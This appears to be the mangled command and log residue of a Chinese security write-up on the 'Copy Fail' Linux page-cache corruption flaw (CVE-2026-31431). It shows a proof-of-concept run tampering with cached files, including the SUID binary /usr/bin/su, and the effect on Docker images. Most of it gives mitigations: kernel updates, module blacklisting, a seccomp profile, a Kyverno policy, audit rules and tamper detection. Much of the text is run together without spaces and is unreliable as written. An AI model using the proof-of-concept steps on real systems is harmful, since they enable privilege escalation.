docker run -d --name copyfail-test python:3.11-slimsleepinfinitydockercppoc_marker.py copyfail-test:/poc_marker.pydockerexeccopyfail-test python3 /poc_marker.py /usr/lib/os-release
# [+] SUCCESS: page cache corrupted! first 4 bytes = deadbeef
# page cache 被篡改期间导出 — 篡改数据固化到 tardockerexportcopyfail-test > tainted.tartar xf tainted.tar --to-stdout usr/lib/os-release |head-c 20 | xxd
# 00000000: dead beef 5459 5f4e 414d 453d 2244 6562 ....TY_NAME="Deb
# drop_caches 后重新导出 — 新的 tar 恢复原始数据echo3 > /proc/sys/vm/drop_cachesdockerexportcopyfail-test > clean.tartar xf clean.tar --to-stdout usr/lib/os-release |head-c 20 | xxd
# 00000000: 5052 4554 5459 5f4e 414d 453d 2244 6562 PRETTY_NAME="Deb
# 关键: 即使 page cache 已被清除, 第一个 tar 中的篡改数据永久存在tar xf tainted.tar --to-stdout usr/lib/os-release |head-c 20 | xxd
# 00000000: dead beef 5459 5f4e 414d 453d 2244 6562 ....TY_NAME="Deb ← 永久固化
# 重新篡改 page cachedockerexeccopyfail-test python3 /poc_marker.py /usr/lib/os-release
# commit 并从新镜像启动 — 读到篡改数据（来自 page cache）docker commit copyfail-test copyfail-committed:
testdocker run --rmcopyfail-committed:
testhead-c 20 /usr/lib/os-release | xxd
# 00000000: dead beef 5459 5f4e 414d 453d 2244 6562 ....TY_NAME="Deb
# drop_caches 后再启动 — 读到原始数据（从磁盘重新加载）echo3 > /proc/sys/vm/drop_cachesdocker run --rmcopyfail-committed:
testhead-c 20 /usr/lib/os-release | xxd
# 00000000: 5052 4554 5459 5f4e 414d 453d 2244 6562 PRETTY_NAME="Deb
docker diff copyfail-test#A /poc_marker.py ← 只显示 upper layer 变更#C /usr/local/lib/... ← Python 缓存文件
# ← /usr/lib/os-release 未出现！
LAYER=$(docker inspect copyfail-test --format'{{.GraphDriver.Data.LowerDir}}' |tr':''n'| xargs -I{} sh -c'test -f {}/usr/lib/os-release && echo {}'|head-1)head-c 16"$LAYER/usr/lib/os-release"| xxd -p
# deadbeef54595f4e414d453d22446562 ← 宿主机读 layer 路径 = 读 page cacheecho3 > /proc/sys/vm/drop_cacheshead-c 16"$LAYER/usr/lib/os-release"| xxd -p
# 5052455454595f4e414d453d22446562 ← drop_caches 后才能看到原始数据
# 1. 检查内核版本是否在受影响范围uname-r
# 2. 检查 algif_aead 是可加载模块还是内建模块
# 有输出 → 可加载模块; 无输出 → 内建模块modinfo algif_aead 2>/dev/null &&echo"==> LOADABLE module"||echo"==> BUILT-IN or not present"# 3. 检查是否已有缓解措施
# Debian/Ubuntu: kmod 缓解grep -r algif_aead /etc/modprobe.d/ 2>/dev/null
# RHEL/CentOS: initcall_blacklistcat/proc/cmdline | grep -o'initcall_blacklist=[^ ]*'
# Debian/Ubuntu:
sudo apt update && sudo apt upgrade
# Alpine:
apk update && apk upgrade
# Arch:
pacman -Syu
# SUSE:
zypper update
# RHEL/CentOS:
sudo dnf update kernel && reboot
# Fedora:
sudo dnf upgrade --refresh && reboot
echo"install algif_aead /bin/false"| sudotee/etc/modprobe.d/disable-algif_aead.confsudo rmmod algif_aead 2>/dev/null || sudo reboot
grep CRYPTO_USER_API_AEAD /boot/config-$(uname-r)
# CONFIG_CRYPTO_USER_API_AEAD=y ← 内建! 非模块rmmod algif_aead 2>&1
# rmmod: ERROR: Module algif_aead is builtin.
# 禁用 algif_aead 初始化grubby --update-kernel=ALL --args="initcall_blacklist=algif_aead_init"reboot
# 更激进的方式: 禁用整个 AF_ALG 接口grubby --update-kernel=ALL --args="initcall_blacklist=af_alg_init"reboot
python3 -c"import socket; socket.socket(38,5,0)"2>&1
# 预期: OSError: [Errno 97] Address family not supported by protocol
# 或: OSError: [Errno 93] Protocol not supported
docker--version
# Docker version29.4.3或更高 → 已内置防御
# 验证docker run--rm python:3.11-slim python3 -c "import socket
try: socket.socket(38,5,0) print('[!] FAIL — AF_ALG not blocked')exceptOSErrorase: print(f'[+] AF_ALG blocked: {e}')"
{"defaultAction":"SCMP_ACT_ALLOW","syscalls":[{"names":["socket"],"action":"SCMP_ACT_ERRNO","errnoRet":1,"args":[{"index":0,"value":38,"op":"SCMP_CMP_EQ"}]}]}
docker run --rm--security-opt seccomp=block-af-alg.json python:3.11-slim python3 -c"import socket
try: socket.socket(38, 5, 0) print('[!] FAIL')
except PermissionError as e: print(f'[+] AF_ALG blocked: {e}')s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)print('[+] TCP socket OK')s.close()"# [+] AF_ALG blocked: [Errno 1] Operation not permitted
# [+] TCP socket OK
cpblock-af-alg.json /var/lib/kubelet/seccomp/# k3s 路径: /var/lib/rancher/k3s/agent/seccomp/
spec:
securityContext:
seccompProfile:
type:
LocalhostlocalhostProfile:
block-af-alg.json
apiVersion:
kyverno.io/v1kind:
ClusterPolicymetadata:
name:
require-seccomp-block-af-algspec:
validationFailureAction:
Enforcerules:-name:
check-seccompmatch:
any:-resources:
kinds:["Pod"]validate:
message:"Pod must use block-af-alg seccomp profile (CVE-2026-31431 mitigation)"pattern:
spec:
securityContext:
seccompProfile:
type:"Localhost"localhostProfile:"block-af-alg.json"
# 持久化审计规则cat> /etc/audit/rules.d/copyfail.rules <<'EOF'-a always,exit-Farch=b64 -S socket -F a0=38 -k copyfail_af_alg-a always,exit-Farch=b64 -S splice -k copyfail_spliceEOFaugenrules --load
普通read:文件→[PageCache]→用户buffer ←读到篡改后的数据O_DIRECT:文件→[磁盘] →用户buffer ←读到原始数据如果两者不同→PageCache被非法修改
# Copy Fail 篡改 /usr/bin/su 的 ELF headerpython3 poc_marker.py /usr/bin/su
# [+] SUCCESS: page cache corrupted! first 4 bytes = deadbeef
# O_DIRECT 比对立即检测到差异
# Page cache [0:16]: deadbeef020101000000000000000000 ← 篡改后
# O_DIRECT [0:16]: 7f454c46020101000000000000000000 ← 磁盘原始 ELF header
# [ALERT] SUID binary TAMPERED! 4 bytes differ at: [0, 1, 2, 3]
2026-05-08 06:57:34 INFO Found 21 SUID/SGID files2026-05-08 06:57:34 INFO Monitoring mount (FAN_OPEN_EXEC_PERM): /usr2026-05-08 06:57:34 INFO Guard active [ENFORCE] (event_size=24, check_root=False)
# Copy Fail 篡改 /usr/bin/su 后，普通用户尝试执行:
2026-05-08 06:57:38 WARNING [ALERT] BLOCKED pid=2677362 uid=1000 /usr/bin/su (page cache tampered at offset 0)
# 用户侧:$ /usr/bin/subash: /usr/bin/su: 不允许的操作 (exit126)
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778507534-wxsync-2026-05-907e6d4a62e530e782dcc2de1e560325.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778507536-wxsync-2026-05-552305b77aa7d3e364eccdcec436f6a8.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778507538-wxsync-2026-05-8d7ea31007c4d3da4976f0e3c79a694a.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778507539-wxsync-2026-05-f241317b6bfa8433f4afdf31808ea016.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778507541-wxsync-2026-05-fcf7c579c67e5b66d6e069132a2cc9d2.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778507542-wxsync-2026-05-6859a0e346544e71a807dc4d80617777.jpg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778507544-wxsync-2026-05-92309b373f96ed8f73941e7171a361bc.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778507545-wxsync-2026-05-3a617f4c52162a4c50910ebb8462ddf4.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778507546-wxsync-2026-05-0b1830776700b8cd363fe1ba3c62e7c8.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2026/05/1778507548-wxsync-2026-05-fceeb9e5d511912a6a365cadc371ba34.jpg)